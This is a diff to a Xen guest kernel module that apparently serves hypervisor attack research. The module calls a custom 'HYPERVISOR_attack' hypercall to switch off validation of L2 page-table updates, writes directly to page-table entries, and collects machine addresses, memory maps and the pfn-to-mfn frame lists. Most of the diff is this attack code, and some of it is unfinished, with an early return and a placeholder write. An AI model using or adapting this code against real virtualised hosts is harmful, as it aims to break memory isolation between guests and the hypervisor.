@@ -6,6 +6,7 @@
 #include <linux/slab.h>
 #include <linux/sched.h>
 #include <linux/gfp.h>
+#include <linux/highmem.h>
 
 
 /* Xen  Includes */
@@ -15,8 +16,8 @@
 #include <asm/xen/hypercall.h>
 #include <xen/interface/event_channel.h>
 #include <xen/xen.h>
-#include <xen/xen.h>
 #include <xen/interface/xen.h>
+#include <xen/interface/memory.h>
 #include <xen/interface/attack.h>
 #include <asm/xen/interface.h>
 
@@ -56,10 +57,46 @@
 static int clear = 0;
 module_param(clear, int, 0);
 
+static int addrs_ptr = 0;
+static attack_t at_arg;
 
 static void* l2_entry_va;
 
-void page_walk(unsigned long va)
+
+void print_xen_start_info_content(void){
+	struct start_info *x = xen_start_info;
+printk("\n\n\
+  char magic[32]='%s'\t\t/* 'xen-<version>-<platform>'.            */\n\
+  unsigned long nr_pages=%ld\t\t\t/* Total pages allocated to this domain.  */\n\
+  unsigned long shared_info=%p\t/* MACHINE address of shared info struct. */\n\
+  uint32_t flags=%X\t\t\t\t/* SIF_xxx flags.                         */\n\
+  xen_pfn_t store_mfn=%ld\t\t/* MACHINE page number of shared page.    */\n\
+  uint32_t store_evtchn=%d\t\t/* Event channel for store communication. */\n\
+  union {\n\
+    struct {\n\
+            xen_pfn_t mfn=%ld\t/* MACHINE page number of console page.   */\n\
+            uint32_t  evtchn=%d\t/* Event channel for console page.        */\n\
+    } domU;\n\
+    struct {\n\
+            uint32_t info_off;  /* Offset of console_info struct.         */\n\
+            uint32_t info_size; /* Size of console_info struct from start.*/\n\
+    } dom0;\n", x->magic, x->nr_pages, (void *) x->shared_info, x->flags, x->store_mfn,
+x->store_evtchn,x->console.domU.mfn, x->console.domU.evtchn);
+
+printk("  } console;\n\
+  /* THE FOLLOWING ARE ONLY FILLED IN ON INITIAL BOOT (NOT RESUME).     */\n\
+  unsigned long pt_base=%p\t\t/* VIRTUAL address of page directory.     */\n\
+  unsigned long nr_pt_frames=%ld\t\t\t/* Number of bootstrap p.t. frames.       */\n\
+  unsigned long mfn_list=%p\t/* VIRTUAL address of page-frame list.    */\n\
+  unsigned long mod_start=%p\t/* VIRTUAL address of pre-loaded module.  */\n\
+  unsigned long mod_len=%ld\t/* Size (bytes) of pre-loaded module.     */\n\
+  int8_t cmd_line[MAX_GUEST_CMDLINE]%s\n\
+",(void *) x->pt_base,x->nr_pt_frames,(void *) x->mfn_list,(void *) x->mod_start, 
+x->mod_len, x->cmd_line
+);
+}
+
+void page_walk(unsigned long va, int fill_at)
 {
 	pgd_t *pgd;
 	pud_t *pud;
@@ -71,6 +108,15 @@ void page_walk(unsigned long va)
 	pud = pud_offset(pgd, va);
 	pmd = pmd_offset(pud, va);
 	pte = pte_offset_kernel(pmd, va);
+
+    if (fill_at){
+        at_arg.addrs[addrs_ptr++] = __machine_addr(va);
+        at_arg.addrs[addrs_ptr++] = (unsigned long) __machine_addr(pgd);
+        at_arg.addrs[addrs_ptr++] = (unsigned long)  __machine_addr(pud);
+        at_arg.addrs[addrs_ptr++] = (unsigned long)  __machine_addr(pmd);
+        at_arg.addrs[addrs_ptr++] = (unsigned long)  __machine_addr(pte);
+    }
+
 	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
 	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
 	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
@@ -191,20 +237,59 @@ int unset_l2_pse_flag(unsigned long va)
 void bypass_l2_update(int set, unsigned long va, int debug){
 
     long ret;
-    attack_t at_arg = {0, 0};
-    unsigned long l2_addr = __machine_addr((void*)va) | PMD_FLAG;
+    pmd_t *pmd = get_pmd((unsigned long)l2_entry_va);
 
     if ( debug )
-        at_arg.debug = 1;
-    at_arg.addr = l2_addr;
+        at_arg.debug = 20;
+    at_arg.addr = pmd->pmd;
 
     ret = HYPERVISOR_attack(set, (void*) &at_arg);
 
     if ( ret )
         DEBUG("Error on invoking the %d bypass update. Error:  %ld",set, ret);
 
+	ret = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd & ~_PAGE_PSE);
+	if(ret < 0)
+		DEBUG("cannot unset PSE flag on PMD (0x%lx)\n", va);
+
+}
+int get_m2psdphys(struct xen_machphys_mapping *mp_map)
+{
+    int rc;
+    rc = HYPERVISOR_memory_op(XENMEM_machphys_mapping, mp_map);
+    if( rc ){
+        printk("Error on obtaining the machphy_mapping %d", rc);
+        return rc;
+    }
+
+    return 0;
 }
 
+
+int get_xmm(struct xen_memory_map *xmm)
+{
+    int rc;
+    rc = HYPERVISOR_memory_op(XENMEM_memory_map, xmm);
+    if( rc ){
+        printk("Error on obtaining the memory map %d", rc);
+        return rc;
+    }
+
+    return 0;
+
+}
+
+void test_mmu_update(void){
+    DEBUG("Init!");
+    bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
+    DEBUG("l2_entry_va 0x%lx",(unsigned long)l2_entry_va);
+    DEBUG("(unsigned long *) l2_entry_va 0x%lx",(unsigned long)(unsigned long*) l2_entry_va);
+    print_xen_start_info_content();
+    //DEBUG("*(unsigned long *) l2_entry_va 0x%lx",(unsigned long)*(unsigned long*) l2_entry_va);
+    //*(unsigned long*) l2_entry_va = 1231231L;
+    bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 0);
+    DEBUG("END!");
+}
 
 void do_page_buff(unsigned long mfn, char *buff, int what)
 {
@@ -212,16 +297,21 @@ void do_page_buff(unsigned long mfn, char *buff, int what)
     DEBUG("l2 mfn\t%lx", (mfn << PAGE_SHIFT) | PTE_FLAG);
     DEBUG("l2_entry  ma\t%lx", __machine_addr(l2_entry_va));
     DEBUG("l2_entry  ma + pmd flags\t%lx", __machine_addr(l2_entry_va) | PMD_FLAG );
-    DEBUG("l2_entry  \t%lx", (unsigned long)l2_entry_va);
+    DEBUG("l2_entry   \t%lx", (unsigned long)l2_entry_va);
+    //DEBUG("*l2_entry  \t%lx",(unsigned long ) *((unsigned long*)l2_entry_va));
+    DEBUG("l2_entry pmd  \t%lx", (unsigned long) get_pmd((unsigned long)l2_entry_va));
+    DEBUG("l2_entry pmd->pmd  \t%lx", (unsigned long) get_pmd((unsigned long)l2_entry_va)->pmd);
 
 	//set_l2_pse_flag((unsigned long) l2_entry_va);
     DEBUG("bypassing the l2 pointer");
     bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
     DEBUG("Attributing the l2 address to l2_entry_va");
-	*(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
+//	*(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
+	*(unsigned long*) l2_entry_va = 1231231L;
     DEBUG("disabling the bypass");
     bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
 	//unset_l2_pse_flag((unsigned long) l2_entry_va);
+    return;
 
 	if(what == DO_PAGE_READ)
 	{
@@ -476,56 +566,55 @@ int find_vdso_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
 
 struct shared_info dummy_shared_info;
 struct shared_info *HYPERVISOR_shared_info = (void *)&dummy_shared_info;
+static struct arch_shared_info *my_arch;
 
 void map_shared_info(void){
     if (!xen_feature(XENFEAT_auto_translated_physmap)) {
         printk("XENFEAT_auto_translated_physmap not enabled\n");
+        printk("shared_info\t%lx\n", xen_start_info->shared_info);
+        printk("__va(shared_info)\t%lx\n", __va(xen_start_info->shared_info));
         set_fixmap(FIX_PARAVIRT_BOOTMAP, xen_start_info->shared_info);
         HYPERVISOR_shared_info = (struct shared_info *)fix_to_virt(FIX_PARAVIRT_BOOTMAP);
     } else{
         HYPERVISOR_shared_info = (struct shared_info *)__va(xen_start_info->shared_info);
     }
 
-    if(HYPERVISOR_shared_info == &dummy_shared_info){
+    if(HYPERVISOR_shared_info == &dummy_shared_info)
+    {
         printk(KERN_ALERT "shared_info not mapped.\n");
     }
-
-    printk("shared_info address %p\n", &HYPERVISOR_shared_info);
+    else
+    {
+        my_arch = &HYPERVISOR_shared_info->arch;
+        printk("shared_info address %p\n", &HYPERVISOR_shared_info);
+        printk("arch_shared_infp address %p\n", &my_arch);
+    }
 }
 
 
-void print_xen_start_info_content(void){
-	struct start_info *x = xen_start_info;
-printk("\n\n\
-  char magic[32]='%s'\t\t/* 'xen-<version>-<platform>'.            */\n\
-  unsigned long nr_pages=%ld\t\t\t/* Total pages allocated to this domain.  */\n\
-  unsigned long shared_info=%p\t/* MACHINE address of shared info struct. */\n\
-  uint32_t flags=%X\t\t\t\t/* SIF_xxx flags.                         */\n\
-  xen_pfn_t store_mfn=%ld\t\t/* MACHINE page number of shared page.    */\n\
-  uint32_t store_evtchn=%d\t\t/* Event channel for store communication. */\n\
-  union {\n\
-    struct {\n\
-            xen_pfn_t mfn=%ld\t/* MACHINE page number of console page.   */\n\
-            uint32_t  evtchn=%d\t/* Event channel for console page.        */\n\
-    } domU;\n\
-    struct {\n\
-            uint32_t info_off;  /* Offset of console_info struct.         */\n\
-            uint32_t info_size; /* Size of console_info struct from start.*/\n\
-    } dom0;\n", x->magic, x->nr_pages, (void *) x->shared_info, x->flags, x->store_mfn,
-x->store_evtchn,x->console.domU.mfn, x->console.domU.evtchn);
+void print_my_arch_info(void)
+{
+    xen_pfn_t *mfn_list = (xen_pfn_t *) get_zeroed_page(__GFP_ZERO);
 
-printk("  } console;\n\
-  /* THE FOLLOWING ARE ONLY FILLED IN ON INITIAL BOOT (NOT RESUME).     */\n\
-  unsigned long pt_base=%p\t\t/* VIRTUAL address of page directory.     */\n\
-  unsigned long nr_pt_frames=%ld\t\t\t/* Number of bootstrap p.t. frames.       */\n\
-  unsigned long mfn_list=%p\t/* VIRTUAL address of page-frame list.    */\n\
-  unsigned long mod_start=%p\t/* VIRTUAL address of pre-loaded module.  */\n\
-  unsigned long mod_len=%ld\t/* Size (bytes) of pre-loaded module.     */\n\
-  int8_t cmd_line[MAX_GUEST_CMDLINE]%s\n\
-",(void *) x->pt_base,x->nr_pt_frames,(void *) x->mfn_list,(void *) x->mod_start, 
-x->mod_len, x->cmd_line
-);
+    printk("max_pfn\t%ld\n",my_arch->max_pfn);
+    xen_pfn_t pfmfll =  my_arch->pfn_to_mfn_frame_list_list << PAGE_SHIFT;
+    set_fixmap(FIX_PARAVIRT_BOOTMAP, pfmfll);
+    pfmfll = fix_to_virt(FIX_PARAVIRT_BOOTMAP);
+    printk("pfn_to_mfn_frame_list_list\t%lx\n",pfmfll);
+    /*
+    struct page *pg = pfn_to_page(my_arch->pfn_to_mfn_frame_list_list);
+    get_page(pg);
+    xen_pfn_t *mfn_list = (xen_pfn_t*)kmap(pg);
+    */
+    memcpy((void*) mfn_list,(void*) pfmfll, PAGE_SIZE);
+    printk("mfn_list[0]\t%lx\n",mfn_list[0]);
+
+
 }
+
+
+
+
 
 void print_kmemory_info(void * ret){
     printk("Address of ret \t\t\t%p\n", &ret);
@@ -562,6 +651,7 @@ static int __init hc_xen_ver_init(void) {
 
 	unsigned long ret = 0;
     printk("Loading the hc_xen_ver : %s\n",__FUNCTION__);
+    print_xen_start_info_content();
 
     if (clear)
     {
@@ -619,13 +709,14 @@ static int __init hc_xen_ver_init(void) {
 	aligned_mfn_va = (void*) __get_free_pages(__GFP_ZERO, 9);
 	DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
 	DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
-    page_walk((unsigned long) aligned_mfn_va);
+    page_walk((unsigned long) aligned_mfn_va, 0);
 
 	// get a 2Mb virtual memory
 	l2_entry_va = (void*) __get_free_pages(__GFP_ZERO, 9);
 	DEBUG("l2_entry_va = %p", l2_entry_va);
 	DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
-	page_walk((unsigned long) l2_entry_va);
+	page_walk((unsigned long) l2_entry_va, 0);
+
 
 	if(startup_dump((unsigned long) l2_entry_va, (unsigned long) aligned_mfn_va))
 	{
@@ -638,13 +729,40 @@ static int __init hc_xen_ver_init(void) {
 	DEBUG("startup_dump ok\n\n");
 	DEBUG("l2_entry_va = %p", l2_entry_va);
 	DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
-	page_walk((unsigned long) l2_entry_va);
+	page_walk((unsigned long) l2_entry_va, 1);
 
 	DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
 	DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
-    page_walk((unsigned long) aligned_mfn_va);
+    page_walk((unsigned long) aligned_mfn_va, 1);
 
-   // mdelay(100);
+
+    struct xen_machphys_mapping mp_map;
+    int rc;
+    rc = get_m2psdphys(&mp_map);
+    if (!rc) {
+        DEBUG("Machine to pseudo physical mapping");
+        DEBUG("max_mfn:%lx", mp_map.max_mfn);
+        DEBUG("v_start:%lx", mp_map.v_start);
+        DEBUG("v_end:%lx", mp_map.v_end);
+    }
+
+    struct xen_memory_map xmm;
+
+    rc = get_xmm(&xmm);
+    if (!rc) {
+        DEBUG("Xem Memory Map");
+        DEBUG("nr_entries:%x", xmm.nr_entries);
+        DEBUG("buffer:%lx", (unsigned long) xmm.buffer);
+    }
+
+    map_shared_info();
+    print_my_arch_info();
+
+
+
+    //test_mmu_update();
+    return 0;
+    // mdelay(100);
 
     //printk("\n\n");
 	//print_xen_start_info_content();
